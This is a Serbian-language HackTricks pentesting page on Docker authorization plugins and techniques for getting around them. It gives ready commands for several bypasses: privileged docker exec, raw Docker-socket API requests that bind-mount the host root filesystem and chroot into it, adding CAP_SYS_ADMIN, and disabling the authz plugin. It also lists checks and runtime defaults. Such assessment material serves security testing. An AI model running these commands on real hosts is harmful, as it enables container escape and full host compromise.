# Dodaci za autorizaciju tokom izvršavanja

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Dodaci za autorizaciju tokom izvršavanja predstavljaju dodatni sloj pravila koji odlučuje da li pozivalac sme da izvrši određenu radnju demona. Docker je klasičan primer. Podrazumevano, svako ko može da komunicira sa Docker demonom praktično ima široku kontrolu nad njim. Dodaci za autorizaciju pokušavaju da suze taj model tako što proveravaju identitet autentifikovanog korisnika i zatraženu API operaciju, a zatim dozvoljavaju ili odbijaju zahtev u skladu sa pravilima.

Ova tema zaslužuje zasebnu stranicu jer menja model eksploatacije kada napadač već ima pristup Docker API-ju ili korisniku u grupi `docker`. U takvim okruženjima pitanje više nije samo „mogu li da pristupim demonu?“ već i „da li je demon ograničen slojem za autorizaciju i, ako jeste, može li se taj sloj zaobići preko neobrađenih krajnjih tačaka, slabog JSON parsiranja ili dozvola za upravljanje dodacima?“

## Rad

Kada zahtev stigne do Docker demona, podsistem za autorizaciju može da prosledi kontekst zahteva jednom ili više instaliranih dodataka. Dodatak vidi identitet autentifikovanog korisnika, detalje zahteva, odabrana zaglavlja i delove tela zahteva ili odgovora kada je tip sadržaja odgovarajući. Više dodataka može da se poveže u lanac, a pristup se odobrava samo ako svi dodaci dozvole zahtev.

Ovaj model zvuči robusno, ali njegova bezbednost u potpunosti zavisi od toga koliko je autor pravila temeljno razumeo API. Dodatak koji blokira `docker run --privileged`, ali ignoriše `docker exec`, propušta alternativne JSON ključeve kao što je `Binds` na najvišem nivou ili dozvoljava upravljanje dodacima, može stvoriti lažan osećaj ograničenja, a pritom ostaviti otvorene direktne puteve za eskalaciju privilegija.

## Uobičajene mete dodataka

Važne oblasti za pregled pravila su:

- krajnje tačke za kreiranje kontejnera
- polja `HostConfig`, kao što su `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` i opcije za deljenje imenskih prostora
- ponašanje komande `docker exec`
- krajnje tačke za upravljanje dodacima
- sve krajnje tačke koje mogu posredno da pokrenu radnje izvršavanja izvan predviđenog modela pravila

Istorijski primeri, kao što je Twistlock-ov dodatak `authz` i jednostavni edukativni dodaci kao što je `authobot`, olakšali su proučavanje ovog modela jer su njihove datoteke sa pravilima i putanje kroz kod pokazivale kako je mapiranje krajnjih tačaka na radnje zaista implementirano. Za potrebe procene, važna pouka je da autor pravila mora da razume čitav API, a ne samo najvidljivije CLI komande.

## Zloupotreba

Prvi cilj je da se utvrdi šta je zaista blokirano. Ako demon odbije radnju, greška često otkriva naziv dodatka, što pomaže u prepoznavanju korišćene kontrole:

```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```

Ako vam je potrebno šire profilisanje krajnjih tačaka, korisni su alati kao što je `docker_auth_profiler`, jer automatizuju inače repetitivan zadatak provere toga koje API rute i JSON strukture plugin zaista dozvoljava.

Ako okruženje koristi prilagođeni plugin i možete da komunicirate sa API-jem, popišite koja polja objekta se zaista filtriraju:

```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```

Ove provere su važne jer se mnogi propusti u autorizaciji odnose na određena polja, a ne na koncepte. Dodatak može da odbije CLI obrazac, a da pritom ne blokira u potpunosti ekvivalentnu API strukturu.

### Potpun primer: `docker exec` dodaje privilegije nakon kreiranja kontejnera

Pravila koja blokiraju kreiranje privilegovanih kontejnera, ali dozvoljavaju kreiranje neograničenih kontejnera uz `docker exec`, ipak mogu biti zaobiđena:

```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```

Ako daemon prihvati drugi korak, korisnik je povratio privilegovani interaktivni proces unutar kontejnera za koji je autor pravila verovao da je ograničen.

Ograničeno `sudo` pravilo može da otvori isti put čak i kada pozivalac ne može direktno da pristupi Docker socket-u. Na primer, dozvola za `/usr/bin/docker exec *` sa root privilegijama može pozivaocu omogućiti da prosledi Docker opcije `--privileged` i `--user root`. Potreban je pokrenut kontejner; na nekim Linux hostovima njegov ID se vidi u komandnoj liniji procesa `containerd-shim` kada je komanda `docker ps` zabranjena. Posmatrajte ovo pravilo kao trag za proveru: potvrdite efektivnu sudo politiku, kontrole autorizacije daemon-a, user namespaces i da li rezultujući proces može da pristupi host uređaju ili host mount-u sa dozvolom za pisanje. Docker opisuje exec opcije u svojoj [CLI referenci](https://docs.docker.com/reference/cli/docker/container/exec/).

Wrapper koji se pokreće kao root i prihvata Compose fajl koji bira pozivalac mora da proveri ceo [Compose service model](https://docs.docker.com/reference/compose-file/services/), a ne samo da odbije `privileged: true` i zahteva `:ro` za bind mount-ove. Proverite `cap_add`, `security_opt`, uređaje, namespaces, ulazne podatke za build i sve podržane sintakse za volume. Bind mount samo za čitanje i dalje može postati zapisiv iz kontejnera sa odgovarajućim capabilities i blažim bezbednosnim ograničenjima, u zavisnosti od politike daemon-a i kernela. Potrebno je proveriti i allowlist-e host putanja zasnovane samo na prefiksu i provere symlink-ova samo na završnoj komponenti putanje. Sudo pravilo i doslovni poziv `docker-compose up` ukazuju na mogući slučaj; mogućnost eksploatacije zavisi od efektivne validacije wrapper-a i ograničenja daemon-a tokom izvršavanja.

### Potpun primer: Bind mount preko Raw API-ja

Neke neispravne politike proveravaju samo jedan JSON oblik. Ako bind mount korenskog fajl sistema nije dosledno blokiran, host i dalje može da se montira:

```bash
docker version
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```

Ista ideja može se pojaviti i pod `HostConfig`:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
  http:/v1.41/containers/create
```

Uticaj je potpuno bekstvo iz fajl-sistema hosta. Zanimljivo je da do zaobilaženja dolazi zbog nepotpune pokrivenosti pravilima, a ne zbog greške u kernelu.

### Potpun primer: neprovereni atribut capability

Ako pravilo zaboravi da filtrira atribut povezan sa capability-jem, napadač može da kreira kontejner koji ponovo dobija opasnu capability:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```

Kada je prisutan `CAP_SYS_ADMIN` ili neka slično moćna capability, postaju dostupne mnoge breakout tehnike opisane u [capabilities.md](protections/capabilities.md) i [privileged-containers.md](privileged-containers.md).

### Potpuni primer: Isključivanje dodatka

Ako su dozvoljene operacije upravljanja dodacima, najčistiji način za zaobilaženje kontrole može biti da je potpuno isključite:

```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```

Ovo je propust u pravilima na nivou kontrolne ravni. Sloj autorizacije postoji, ali korisnik kog je trebalo da ograniči i dalje ima dozvolu da ga onemogući.

## Provere

Ove komande služe da utvrde da li sloj pravila postoji i da li deluje potpun ili površan.

```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```

Šta je ovde zanimljivo:

- Poruke o odbijanju koje sadrže naziv plugin-a potvrđuju postojanje authorization sloja i često otkrivaju tačnu implementaciju.
- Lista plugin-a vidljiva napadaču može biti dovoljna da otkrije da li su operacije onemogućavanja ili ponovnog konfigurisanja moguće.
- Politiku koja blokira samo očigledne CLI radnje, ali ne i direktne API zahteve, treba smatrati zaobilazivom dok se ne dokaže suprotno.

## Podrazumevane vrednosti runtime okruženja

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Nije podrazumevano omogućen | Pristup daemon-u je praktično sve-ili-ništa, osim ako nije konfigurisan authorization plugin | nepotpuna politika za plugin, crne liste umesto belih lista, dozvoljeno upravljanje plugin-ima, slepe tačke na nivou polja |
| Podman | Nema uobičajenog direktnog ekvivalenta | Podman se obično više oslanja na Unix dozvole, rootless izvršavanje i odluke o izlaganju API-ja nego na Docker-style authz plugin-e | široko izlaganje rootful Podman API-ja, slabe dozvole za socket |
| containerd / CRI-O | Drugačiji model kontrole | Ovi runtime-i se obično oslanjaju na dozvole za socket, granice poverenja čvorova i kontrole orkestratora na višem nivou, a ne na Docker authz plugin-e | montiranje socket-a u workload-e, slabe pretpostavke o lokalnom poverenju čvora |
| Kubernetes | Koristi authn/authz na slojevima API server-a i kubelet-a, a ne Docker authz plugin-e | Cluster RBAC i admission kontrole predstavljaju glavni sloj politike | preširok RBAC, slaba admission politika, direktno izlaganje kubelet ili runtime API-ja |

{{#include ../../../banners/hacktricks-training.md}}
